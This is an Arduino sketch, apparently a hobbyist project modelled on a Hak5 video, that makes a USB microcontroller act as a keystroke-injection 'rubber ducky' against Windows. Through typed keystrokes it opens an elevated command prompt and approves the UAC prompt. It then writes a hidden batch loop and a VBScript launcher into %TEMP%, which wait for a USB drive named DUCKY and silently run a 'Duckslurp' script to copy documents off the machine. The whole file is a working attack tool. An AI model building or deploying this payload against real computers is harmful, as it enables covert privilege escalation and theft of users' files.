/*
  Made By Jacob Still
  Published March 1, 2018

  This sketch is basically what Darren from Hak5 did, but
  on an Arduino

  Hak5 video: https://www.youtube.com/watch?v=6Ay9tpvnuJM
  
  This sketch injects keystrokes (like a rubber ducky)
  into a Windows box and sets up a script for document
  transfer to a USB drive named Ducky

  REQUIREMENTS TO FUNCTION:
  -Windows box
  -user with admin rigts
  -USB drive named "DUCKY"

  Commands Injected:
    Command Prompt:
      powershell start-process cmd.exe -verb runAs
      cd %TEMP%
      erase /Q DuckyWait.bat
      copy con DuckyWait.bat
        @echo off
        :while1
        for /f \"tokens=3 delims= \" %%A in ('echo list volume ^| diskpart ^| findstr \"DUCKY\"') DO (set DUCKYdrive=%%A:)
        if [%DUCKYdrive%] EQU [] (
        timeout /t 3
        goto :while1
        ) else (
        goto :break
        )
        timeout /t 30
        goto :while1
        :break
        wscript.exe invis.vbs %DUCKYdrive%\\Duckslurp\\Duckslurp.bat
      erase /Q invis.vbs
      copy con invis.vbs
        CreateObject(\"Wscript.Shell\").Run\"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False
      wscript.exe invis.vbs DuckyWait.bat
      exit    
*/
#include "Keyboard.h"

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(750);
//cmd and Bypass UAC
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(250);
  Keyboard.print("powershell start-process cmd.exe -verb runAs");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1500);
//CD to TEMP
  Keyboard.print("cd %TEMP%");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Erase DuckyWait.bat
  Keyboard.print("erase /Q DuckyWait.bat");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Create DuckyWait.bat
  Keyboard.print("copy con DuckyWait.bat");
  typeKey(KEY_RETURN);
  Keyboard.print("@echo off");
  typeKey(KEY_RETURN);
  Keyboard.print(":while1");
  typeKey(KEY_RETURN);
  Keyboard.print("for /f \"tokens=3 delims= \" %%A in ('echo list volume ^| diskpart ^| findstr \"DUCKY\"') DO (set DUCKYdrive=%%A:)");
  typeKey(KEY_RETURN);
  Keyboard.print("if [%DUCKYdrive%] EQU [] (");
  typeKey(KEY_RETURN);
  Keyboard.print("timeout /t 3");
  typeKey(KEY_RETURN);
  Keyboard.print("goto :while1");
  typeKey(KEY_RETURN);
  Keyboard.print(") else (");
  typeKey(KEY_RETURN);
  Keyboard.print("goto :break");
  typeKey(KEY_RETURN);
  Keyboard.print(")");
  typeKey(KEY_RETURN);
  Keyboard.print("timeout /t 30");
  typeKey(KEY_RETURN);
  Keyboard.print("goto :while1");
  typeKey(KEY_RETURN);
  Keyboard.print(":break");
  typeKey(KEY_RETURN);
  Keyboard.print("wscript.exe invis.vbs %DUCKYdrive%\\Duckslurp\\Duckslurp.bat");
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.print("z");
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Erase invis.vbs
  Keyboard.print("erase /Q invis.vbs");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Create invis.vbs
  Keyboard.print("copy con invis.vbs");
  typeKey(KEY_RETURN);
  Keyboard.print("CreateObject(\"Wscript.Shell\").Run\"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.print("z");
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Launch invisible DuckyWait.bat and exit
  Keyboard.print("wscript.exe invis.vbs DuckyWait.bat");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
//Exit cmd
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop(){
// Unused bc we dont want to loop the payloads
// could use:
// while(true){} to end payloads
// but not worth the effort :)
}

